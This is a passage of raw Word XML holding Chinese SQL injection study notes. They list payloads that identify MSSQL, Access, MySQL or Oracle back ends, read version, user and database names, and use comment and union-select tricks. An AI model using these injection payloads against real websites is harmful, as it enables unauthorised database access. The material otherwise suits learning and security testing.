        <w:t>解释</w:t>
      </w:r>
      <w:r w:rsidR="00162020">
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Mysql</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>同时操作字符串和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>会尝试将</w:t>
      </w:r>
      <w:r w:rsidR="008B48E4">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidR="008B48E4">
        <w:t>archar</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>转换为数字类型（</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>取</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>varchar</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>最前面的数字作为</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的值</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00E359AB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如果没有，</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>就当做数字</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处理）。如’</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1abc</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>′，</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将“</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1abc</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”转成数字</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在进行运算；</w:t>
      </w:r>
      <w:r w:rsidR="006A5654">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>而</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将“</w:t>
      </w:r>
      <w:r w:rsidR="006A5654">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xyz</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”当做</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处理。</w:t>
      </w:r>
      <w:r w:rsidR="00F20096" w:rsidRPr="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>小技巧</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：在注入时，使用</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:t>’str’^1^1</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将字符串强制转换为</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="006B7F02" w:rsidRDefault="000F184C" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="006B7F02">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="006B7F02">
        <w:t>内置对象：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F184C" w:rsidRDefault="000F184C" w:rsidP="000F184C">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and (select count(*) from sysobjects)&gt;=0      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>返回正常为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mssql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F184C" w:rsidRDefault="000F184C" w:rsidP="000F184C">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and (select count(*) from msysobjects)&gt;=0     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>返回正常为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>access</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F03E3B" w:rsidRDefault="000F184C" w:rsidP="00F03E3B">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and exists(select * from sysobjects)           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>返回正常为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mssql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入点</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F03E3B" w:rsidRDefault="00F03E3B" w:rsidP="00F03E3B">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:t>and (select count(*) from information_schema. TABLES)&gt;0 and 1=1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F03E3B" w:rsidRDefault="00F03E3B" w:rsidP="00F03E3B">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="84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</w:t>
      </w:r>
      <w:r>
        <w:t>正常为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>&gt;=5.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F03E3B" w:rsidRDefault="00F15A54" w:rsidP="00F03E3B">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00F15A54">
        <w:t>and (select count(*) from sys.user_tables)&gt;0 and 1=1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F15A54" w:rsidRPr="00F03E3B" w:rsidRDefault="00F15A54" w:rsidP="00F03E3B">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="84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</w:t>
      </w:r>
      <w:r>
        <w:t>正常为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>oracle</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B7F02" w:rsidRPr="006B7F02" w:rsidRDefault="006B7F02" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="006B7F02">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="006B7F02">
        <w:t>相关信息：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B7F02" w:rsidRDefault="006B7F02" w:rsidP="006B7F02">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and @@version&gt;0                    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>判断数据库版本</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B7F02" w:rsidRDefault="006B7F02" w:rsidP="006B7F02">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and system_user&gt;0                   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库系统用户名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B7F02" w:rsidRDefault="006B7F02" w:rsidP="006B7F02">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>and user&gt;0</w:t>
      </w:r>
      <w:r w:rsidR="00A26D77">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">                          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>获得当前数据库用户名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B7F02" w:rsidRDefault="006B7F02" w:rsidP="006B7F02">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:leftChars="200" w:left="420" w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and db_name()&gt;0--                   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当前库名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="001C5C21" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库报错</w:t>
      </w:r>
      <w:r>
        <w:t>信息：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00556341" w:rsidRDefault="00556341" w:rsidP="00556341">
      <w:pPr>
        <w:ind w:leftChars="400" w:left="840"/>
      </w:pPr>
      <w:r w:rsidRPr="00556341">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>Oracle:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> ORA-01756: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>括号内的字符串没有正确结束</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00556341" w:rsidRDefault="00556341" w:rsidP="00556341">
      <w:pPr>
        <w:ind w:leftChars="400" w:left="840"/>
      </w:pPr>
      <w:r w:rsidRPr="00556341">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mysql:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001C5C21" w:rsidRDefault="00556341" w:rsidP="00556341">
      <w:pPr>
        <w:ind w:leftChars="400" w:left="840"/>
      </w:pPr>
      <w:r w:rsidRPr="00556341">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>MSSQL:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> [Microsoft][ODBC SQL Server Driver][SQL Server]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字符串’’之前有未闭合的引号</w:t>
      </w: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注释：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">mssql:-- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（有空格）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>mysql:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>建议</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>后要加空格或控制字符</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A"/>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ASP+Access</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆数据库类型：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>内置变量爆数据库类型：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>一个内置变量，值为当前连接的用户名，类型为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>"nvarchar"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。测试语句为：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and user&gt;0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将返回类型不一致错误。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>内置数据表爆库类型：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测试语句为：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and (select count(*) from sysobjects)&gt;=0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and (select count(*) from msyobjects)&gt;=0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Access</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>存在系统表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>msysobjects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，不存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sysobjects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>存在系统表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sysobjects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，不存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>msysobjects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A63A45" w:rsidRDefault="00A63A45" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>nion</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> select</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A63A45" w:rsidRPr="00A63A45" w:rsidRDefault="00A63A45" w:rsidP="00A63A45">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>ccess</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>union select</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>一定要指定</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>from table</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>并且</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>table</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>必须</w:t>
      </w:r>
      <w:r w:rsidRPr="00837F80">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>正确</w:t>
      </w:r>
      <w:r>
        <w:t>！</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w: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ASPX+MS SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当前用户权限查询：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
